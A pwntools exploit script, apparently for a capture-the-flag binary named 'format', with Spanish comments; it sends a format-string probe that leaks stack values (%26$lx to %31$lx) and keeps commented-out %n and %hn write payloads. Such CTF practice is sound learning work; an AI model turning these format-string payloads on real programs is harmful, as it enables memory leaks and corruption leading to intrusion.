#!/usr/bin/python3
from pwn import *
context.log_level='debug'


elf = context.binary = ELF("./format")
libc=elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path)
    else:
        return process(elf.path)
# def start():
#     return remote("challenges.ctfd.io","30261")

#def caracter por caracter?
# =============================================================================
io=start()
# print(elf.symbols)
#apartir del 6to argumento comienza el pad

pay = b''
# pay = p64(0x0000000000401030)
# pay+="" #plt 
pay+=b'AAAAAAAA '
# pay+=b'%500x'
# pay+=b'%7$n'
# pay+=b'%'
# pay+="%15$lxc"
# print(elf.symbols['num'])
# pay+="%16$lx"
# pay+="AAAAAAAA"
# pay+="%16705x"
# pay+="%16$hn"
# pay+="%16$hn"
# pay+="%6$hn"

for i in range(26,32):
    pay += bytes(str(i), encoding='utf-8')+b'-%'+bytes(str(i), encoding='utf-8')+b'$lx.'

# print(pay)
# for i in range(0,10):
# pay += b'%lx '*100
# print(pay)
io.sendlineafter("Give me some text.\n",pay)
sleep(0.1)
ret = io.recvuntil("\n",drop=True)
# ret =ret[10:]


io.interactive()